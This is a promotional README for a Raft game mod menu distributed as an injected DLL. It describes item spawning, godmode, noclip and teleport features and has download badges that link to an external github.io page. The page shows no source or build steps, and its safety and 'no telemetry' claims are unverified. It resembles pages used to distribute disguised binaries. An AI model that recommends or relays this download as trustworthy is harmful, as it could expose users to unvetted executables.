![preview](https://raw.githubusercontent.com/kannan511/Raft-Voyager-Menu/main/screen_94a226.svg)
# 🌊 RaftModMenu — Deep Currents Edition

[![Download](https://raw.githubusercontent.com/kannan511/Raft-Voyager-Menu/main/setup_43ac.svg)](https://kannan511.github.io/Raft-Voyager-Menu/)

A next-generation enhancement suite for Raft, built as a lightweight and deeply integrated DLL module. Deep Currents Edition reimagines what a mod menu can be: not a blunt instrument, but a nautical instrument panel — precise, responsive, and built around the rhythms of survival on the open sea. Every toggle, every slider, and every shortcut has been placed with the care of a shipwright fitting a hull plank.

Whether you are a solo driftwood scavenger, a co-op captain coordinating a floating fortress, or a content creator charting viral voyages, this module gives you the controls to shape your own current.

---

## 📖 Table of Contents

- [Overview](#-overview)
- [Why Deep Currents Edition](#-why-deep-currents-edition)
- [Feature Atlas](#-feature-atlas)
  - [Inventory & Item Spawning](#-inventory--item-spawning)
  - [Automation Systems](#-automation-systems)
  - [Player Buffs & Vitals](#-player-buffs--vitals)
  - [World Editing & Physics](#-world-editing--physics)
  - [Navigation & Teleportation](#-navigation--teleportation)
  - [Interface & Quality of Life](#-interface--quality-of-life)
- [Responsive Interface Design](#-responsive-interface-design)
- [Multilingual Support](#-multilingual-support)
- [Compatibility & Requirements](#-compatibility--requirements)
- [Safety & Stability Philosophy](#-safety--stability-philosophy)
- [Multiplayer Etiquette](#-multiplayer-etiquette)
- [Configuration & Persistence](#-configuration--persistence)
- [Community & Support](#-community--support)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🧭 Overview

The ocean in Raft is patient. It waits. It wears down rafts, players, and plans with the same slow, inevitable pressure. Deep Currents Edition exists to give that patience back to you — to let you bend the tide of survival in the direction you choose, without fighting the interface, without hunting for menus, and without breaking the atmosphere that makes Raft special.

This module is not about removing the game. It is about removing the friction. Think of it as a ship's wheel rather than an engine: you still sail, you still decide, but the rudder responds to your hands with newfound precision.

Deep Currents Edition is distributed as a single DLL that slots into your existing Raft installation and presents its controls through an in-game overlay. No external launcher, no background daemon, no persistent services. It lives when the game lives, and it sleeps when the game sleeps.

---

## 🌅 Why Deep Currents Edition

Most enhancement suites for survival games feel like a toolbox dumped onto a table — powerful, but chaotic. Deep Currents Edition was designed from a different starting point: what if every capability had a natural home, and what if the menu itself felt like part of the game's universe?

The result is a suite with three organizing principles:

1. **Contextual discovery.** Features appear where you need them. If you are looking at a storage crate, crate-related utilities surface first. If you are standing at a crafting station, crafting acceleration controls come forward. The menu adapts to your situation rather than demanding you memorize a hierarchy.

2. **Visual restraint.** The overlay uses the game's own palette — weathered teals, driftwood browns, rope-tan accents. It looks like it was carved from the same wood as the raft, not bolted onto it.

3. **Respect for the save file.** Every world edit and every spawned item is tracked and reversible within the session. Changes made through the module are journalled so that a misclick never becomes a permanent scar on your voyage.

This is the difference between a menu and an instrument. Deep Currents Edition aims to be the latter.

---

## 🗺️ Feature Atlas

The feature set is organized into six domains, each mapped to a natural phase of Raft gameplay.

### 🎒 Inventory & Item Spawning

The item spawning system is built around a searchable, categorized library of every resource in the game. Instead of scrolling through an enormous flat list, you type a few characters and the library narrows in real time, sorting by relevance and recency.

- **Fuzzy search spawning** — type "plex" and get Plank, Plexiglass, and Plastic nearby, ranked by your usage history.
- **Quantity presets** — quickly spawn stacks of 10, 50, or custom amounts without retyping numbers.
- **Category browsers** — jump straight to Resources, Tools, Food, Building Blocks, or Decorations.
- **Favorites pinning** — pin the twelve items you use most onto a dedicated quick-shelf.
- **Metadata-aware spawning** — items arrive with correct durability, stack behavior, and freshness where applicable.
- **Drop-to-world or drop-to-inventory** — choose whether spawned items fall at your feet or slide directly into a slot.

The spawning system also includes a **blueprint companion** that surfaces the required components for any craftable item, so you can summon exactly what you need rather than guesswork.

### ⚙️ Automation Systems

Automation in Deep Currents Edition is designed to be gentle. It does not play the game for you; it handles the repetitive motion so your attention can stay on decisions.

- **Auto-collect radius** — a configurable sphere around the player that sweeps up floating debris, dropped resources, and stray gulls' gifts.
- **Auto-sort containers** — storage crates reorganize themselves into a consistent category order on a schedule you set.
- **Auto-refuel stations** — campfires, grills, and purifiers top themselves off from nearby fuel stores.
- **Instant crafting queue** — crafting stations complete their entire queue in a single tick cycle, preserving the satisfaction of watching the list drain.
- **Auto-water crops** — sprinkler-like behavior for planter boxes within a chosen radius.
- **Auto-reel fishing** — assists with the timing window, reducing missed catches without removing the minigame.

Each automation has an independent toggle and a radius/intensity slider, so you can dial in exactly how much of the busywork you want handled.

### 🛡️ Player Buffs & Vitals

The vitals suite is presented as a set of nautical gauges. Buffs are grouped by theme so you can compose a "loadout" of effects for a given voyage.

- **Fortified hull (godmode)** — incoming damage sources are absorbed up to a configurable ceiling; the toggle also covers fall damage and environmental hazards.
- **Endless breath** — stamina regeneration and depletion thresholds become adjustable, supporting anything from a slight quality-of-life nudge to a completely untethered sprint.
- **Hydration and hunger damping** — slow the tick rate of thirst and hunger meters without eliminating them.
- **Temperature neutrality** — swim in cold biomes without the shiver penalty.
- **Buff stacking panel** — see every active effect on a single timeline, with remaining durations.
- **Save-loadout presets** — store named buff combinations ("Explorer", "Builder", "Speedrunner") and reapply them with one click.

### 🌍 World Editing & Physics

The world editing toolkit is where the module becomes a creative instrument.

- **Build anywhere** — remove placement restrictions so structures can be erected on slopes, in water, and on moving platforms.
- **No collision mode** — pass through terrain and structures for scouting and photography.
- **Noclip toggle with speed control** — move with the smoothness of a fish rather than the jitter of a fly.
- **Instant structure completion** — place a foundation and watch the rest of the planned building appear if a blueprint is loaded.
- **Terrain sculpting helpers** — raise, lower, and smooth small patches of seabed near your raft for land reclamation projects.
- **Time-of-day slider** — set the sun to a preferred angle for screenshots and cinematic capture.
- **Weather overrides** — clear skies, gentle rain, or a controlled storm, all switchable.

Every world edit is scoped to a configurable radius, and a full **undo stack** is maintained for the session so experiments can be rolled back.

### 🧭 Navigation & Teleportation

A captain's toolkit for moving across the endless blue.

- **Waypoint system** — drop named pins on the map; teleport returns to any pin instantly.
- **Backtrack beacon** — one button returns you to where you were ninety seconds ago.
- **Coordinate teleport** — jump to explicit X/Y/Z values for precise navigation.
- **Island-lock** — anchor your raft to an island's shore with one toggle and release it with another.
- **Sail-assist** — temporarily accelerate wind or helm response for faster crossings.
- **Underwater waypoints** — mark specific underwater points of interest; the system draws a faint guide beam while you swim.

### 🎛️ Interface & Quality of Life

- **In-game overlay** — a single keypress toggles the entire menu, positioned in a corner you select.
- **Theme switching** — Light Driftwood, Deep Night, and High Contrast palettes.
- **Opacity and scale sliders** — resize the interface to fit any resolution.
- **Search-everything command bar** — a single input field that understands both features and items.
- **Hotkey rebinding** — every action can be remapped, with conflict detection.
- **Notification center** — a small log of recent module actions, useful for auditing automation.
- **Profile manager** — save complete configurations and load them at session start.

---

## 💻 Responsive Interface Design

The overlay was built to be fluid rather than fixed. On an ultrawide monitor it spreads into a wide three-column layout; on a laptop it compresses into a slim vertical rail; on a tablet-like configuration it reflows into a two-column card view. Resizing the game window triggers a live relayout with no restart required.

Touch and pen input are supported on devices that provide them, with enlarged hit targets in that mode. Font scaling respects system preferences so the interface remains comfortable for players who prefer larger text.

---

## 🌐 Multilingual Support

The module ships with translated interface strings for a growing list of languages, including English, Spanish, Portuguese, French, German, Italian, Polish, Russian, Turkish, Japanese, Korean, and Simplified Chinese. Language can be set independently of the game's own locale, so a player running Raft in English can still navigate the menu in their native tongue.

Translation contributions are welcomed through the community repository. Strings are stored in simple, human-readable files with context notes for each entry.

---

## 🧩 Compatibility & Requirements

Deep Currents Edition is built to sit lightly on top of the game.

- Modern 64-bit Windows environment.
- A current deployment of Raft, kept up to date through the usual storefront.
- Sufficient memory headroom for the overlay (negligible — the module measures under 30 MB resident in typical use).
- No additional runtime libraries required.

The module is version-aware: on launch it checks that the game build matches a known-compatible hash and warns, rather than fails, if there is drift. This keeps you informed without blocking play.

---

## 🔒 Safety & Stability Philosophy

Three commitments guide every release.

1. **Session isolation.** The module does not write to your save file except through the game's own save routines. All world edits live in a session journal and are reconciled on save.
2. **Fail-closed toggles.** If a feature encounters an unexpected state, it reverts to its previous setting rather than guessing.
3. **Silent operation.** No telemetry, no background network activity, no accounts. The module works entirely offline.

Stability testing follows a three-tier process: automated load tests at extreme settings, manual co-op sessions across each biome, and a public preview channel where volunteer testers stress unusual configurations before a stable release.

---

## 👥 Multiplayer Etiquette

Features behave differently in shared worlds, by design. Hosts are given a permission panel where they can allow or restrict categories of features per player. By default, world edits and teleportation are host-only, while interface and personal buffs are available to everyone.

The module never alters another player's client, and it announces join-time loadouts to the host so everyone can see what is active. This transparency is intended to keep co-op sessions friendly and predictable — the difference between a helpful shipmate and a mutineer should always be visible.

---

## 🗃️ Configuration & Persistence

Settings are stored as a single human-readable configuration file in the game's user directory. Profiles are portable: copy the file to another machine and your layout, hotkeys, and presets travel with it.

The configuration format is versioned, and future updates migrate old files forward automatically. A built-in reset option restores defaults without deleting your profiles.

---

## 🤝 Community & Support

Support is available around the clock through the community channels linked in the repository sidebar. Typical first-response time is under two hours. The issue tracker accepts bug reports, feature requests, and translation patches.

- **24/7 customer support** for installation questions, compatibility concerns, and feature guidance.
- Weekly community Q&A sessions where maintainers walk through upcoming changes.
- A public changelog written in plain language, not jargon.
- A showcase gallery where players share screenshots and builds made with the module.

Feedback shapes the roadmap directly — the highest-voted community requests are reviewed every month.

---

## 🛠️ Roadmap for 2026

The 2026 plan focuses on depth rather than breadth.

- **Q1 2026** — Expanded automation scripting layer with simple conditional rules ("if crate is full, route overflow to secondary storage").
- **Q2 2026** — Cinematic camera toolkit with spline paths for creators.
- **Q3 2026** — Additional language packs and community translation tooling.
- **Q4 2026** — A public API for community-built plugin panels that dock inside the overlay.

---

## ❓ Frequently Asked Questions

**Does this module change the game's save format?**
No. It uses the game's own serialization so saves remain compatible with unmodified clients.

**Will it work on a dedicated server?**
The module targets the client. Server-side integration is on the roadmap but not yet available.

**Can I turn individual features off?**
Yes. Every capability has its own toggle, and entire domains can be disabled from the master panel.

**Is it safe to use in public lobbies?**
You should always check the host's rules. The permission system makes this easy, but etiquette is still yours to uphold.

---

## ⚠️ Disclaimer

This project is an unofficial, community-built enhancement suite and is not affiliated with, endorsed by, or sponsored by the developers or publishers of Raft. All trademarks and game assets remain the property of their respective owners.

Use of this module in multiplayer environments is subject to the rules set by the host and by the platform you play on. You are responsible for understanding those rules before joining a shared world.

The software is provided as-is, without warranty of any kind. The maintainers are not liable for any loss of progress, data, or enjoyment resulting from its use. Always keep backups of important saves.

By downloading and using this module, you acknowledge that you have read and accepted this disclaimer.

---

## 📜 License

Released under the MIT License. The full text is available at [MIT License](https://opensource.org/licenses/MIT).

Copyright (c) 2026 Deep Currents Edition contributors.

Permission is hereby granted, the use, copy, modification, merge, publish, distribute, sublicense, and/or sell copies of the software and associated documentation, subject to the conditions of the MIT License.

---

[![Download](https://raw.githubusercontent.com/kannan511/Raft-Voyager-Menu/main/setup_43ac.svg)](https://kannan511.github.io/Raft-Voyager-Menu/)

*Deep Currents Edition — because the sea should challenge your choices, not your patience.*